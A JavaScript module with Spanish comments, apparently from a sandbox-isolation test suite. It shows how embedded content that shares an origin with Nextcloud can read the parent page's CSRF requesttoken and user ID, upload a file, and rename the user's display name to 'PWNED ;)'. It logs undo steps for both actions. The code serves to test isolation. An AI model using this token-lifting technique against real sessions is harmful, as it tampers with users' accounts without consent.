/*
 * Acciones de demostración contra Nextcloud.
 *
 * Ambas usan la cookie de sesión más el requesttoken leído del DOM del padre.
 * Solo funcionan en same-origin: bajo origen opaco ese DOM es inalcanzable.
 */

export function readRequestToken(ctx) {
  const pd = ctx.parentDoc();
  if (!pd) return null;
  const meta = pd.querySelector('meta[name="requesttoken"]');
  if (meta) return meta.getAttribute('content');
  const head = pd.head;
  return head ? head.getAttribute('data-requesttoken') : null;
}

export function readUserId(ctx) {
  const pw = ctx.parentWin();
  try {
    if (pw && pw.OC && typeof pw.OC.getCurrentUser === 'function') {
      const u = pw.OC.getCurrentUser();
      if (u && u.uid) return u.uid;
    }
  } catch (e) { /* ignorado */ }
  const pd = ctx.parentDoc();
  if (!pd || !pd.head) return null;
  return pd.head.getAttribute('data-user');
}

function readDisplayName(ctx) {
  const pw = ctx.parentWin();
  try {
    if (pw && pw.OC && typeof pw.OC.getCurrentUser === 'function') {
      const u = pw.OC.getCurrentUser();
      if (u && u.displayName) return u.displayName;
    }
  } catch (e) { /* ignorado */ }
  const pd = ctx.parentDoc();
  if (!pd || !pd.head) return null;
  return pd.head.getAttribute('data-user-displayname');
}

function blocked(ctx) {
  try {
    if (ctx.win.origin === 'null' || (ctx.win.location && ctx.win.location.origin === 'null')) {
      return 'BLOQUEADO (origen opaco / modo secure)';
    }
  } catch (e) { /* ignorado */ }
  if (!ctx.parentDoc()) return 'BLOQUEADO: sin acceso al padre (origen opaco / modo secure)';
  return null;
}

function ocsStatus(xml) {
  const m = /<statuscode>(\d+)<\/statuscode>/.exec(xml || '');
  return m ? Number(m[1]) : null;
}

export function uploadFile(ctx, journal, cb) {
  const stop = blocked(ctx);
  if (stop) { cb(stop); return; }

  const token = readRequestToken(ctx);
  const uid = readUserId(ctx);
  const res = { fileUploaded: false };

  if (!token || !uid) {
    res.note = 'sin requesttoken o sin usuario alcanzable (¿sesión abierta?)';
    cb(JSON.stringify(res, null, 2));
    return;
  }

  const name = journal.prefix('nota') + '.txt';
  const path = '/remote.php/dav/files/' + encodeURIComponent(uid) + '/' + encodeURIComponent(name);

  ctx.fetchSameOrigin(path, {
    method: 'PUT',
    headers: { requesttoken: token, 'Content-Type': 'text/plain' },
    body: 'Prueba de concepto de aislamiento. Fichero creado por exe-probe-suite.\n',
  })
    .then((r) => {
      if (!r.ok) {
        res.note = 'el servidor rechazó la subida (HTTP ' + r.status + ')';
        cb(JSON.stringify(res, null, 2));
        return;
      }
      journal.record({
        host: 'nextcloud',
        kind: 'file',
        label: name,
        id: path,
        previous: null,
        undo: () => ctx.fetchSameOrigin(path, {
          method: 'DELETE',
          headers: { requesttoken: token },
        }).then(() => undefined),
      });
      res.fileUploaded = true;
      res.path = path;
      res.note = 'Fichero escrito en tu carpeta personal. Reversible desde el diario.';
      cb(JSON.stringify(res, null, 2));
    })
    .catch((e) => cb('BLOQUEADO: ' + ((e && e.name) || 'Error')));
}

export function renameUser(ctx, journal, cb) {
  const stop = blocked(ctx);
  if (stop) { cb(stop); return; }

  const token = readRequestToken(ctx);
  const uid = readUserId(ctx);
  const previous = readDisplayName(ctx);
  const res = { displayNameChanged: false, previous };

  if (!token || !uid) {
    res.note = 'sin requesttoken o sin usuario alcanzable (¿sesión abierta?)';
    cb(JSON.stringify(res, null, 2));
    return;
  }

  const url = '/ocs/v2.php/cloud/users/' + encodeURIComponent(uid);
  const put = (value) => {
    const body = new URLSearchParams();
    body.set('key', 'displayname');
    body.set('value', value);
    return ctx.fetchSameOrigin(url, {
      method: 'PUT',
      headers: {
        requesttoken: token,
        'OCS-APIRequest': 'true',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: body.toString(),
    });
  };

  journal.record({
    host: 'nextcloud',
    kind: 'user-display-name',
    label: 'displayname de ' + uid,
    id: uid,
    previous,
    undo: previous ? () => put(previous).then(() => undefined) : null,
  });

  put('PWNED ;)')
    .then((r) => r.text())
    .then((xml) => {
      const code = ocsStatus(xml);
      if (code === 100 || code === 200) {
        res.displayNameChanged = true;
        res.note = 'Nombre visible cambiado. Reversible desde el diario.';
      } else {
        // La instancia puede tener deshabilitado el cambio de nombre propio.
        // No lo bloqueó el sandbox: se informa como no completado, nunca como contenido.
        res.note = 'la instancia no completó el cambio (código OCS ' + code + '). ' +
          'No lo impidió el aislamiento.';
      }
      cb(JSON.stringify(res, null, 2));
    })
    .catch((e) => cb('BLOQUEADO: ' + ((e && e.name) || 'Error')));
}
